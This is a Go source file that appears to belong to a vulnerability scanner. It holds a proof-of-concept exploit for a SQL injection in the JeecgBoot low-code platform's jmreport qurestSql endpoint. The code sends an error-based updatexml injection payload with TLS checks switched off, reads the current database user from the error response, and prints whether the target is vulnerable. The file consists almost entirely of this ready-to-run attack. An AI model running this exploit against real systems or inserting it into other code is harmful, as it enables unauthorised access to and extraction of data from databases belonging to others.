package poc

import (
	"PocSir/config"
	"bytes"
	"crypto/tls"
	"io"
	"net/http"
	"strings"
	"time"
)

func JeecgBoot_Sql(target string) {
	pocUrl := target + "/jeecg-boot/jmreport/qurestSql"
	headers := map[string]string{
		"User-Agent":   getRandUa(),
		"Content-Type": "application/json",
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}
	payload := []byte(`{"apiSelectId":"1290104038414721025","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}`)
	req, err := http.NewRequest("POST", pocUrl, bytes.NewBuffer(payload))
	if err != nil {
		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
		return
	}
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		config.ErrMsg.Printf("[-]%s is timeout\n", target)
		return
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == http.StatusOK && strings.Contains(string(data), "XPATH syntax") {
		config.Right.Printf("[+]%s存在JeecgBoot企业级低代码平台 qurestSql SQL注入漏洞\n", target)
		config.TextPut.Printf(string(data) + "\n")
	} else {
		config.ErrMsg.Printf("[-]%s不存在JeecgBoot企业级低代码平台 qurestSql SQL注入漏洞\n", target)
		//config.TextPut.Printf(string(data) + "\n")
	}
}
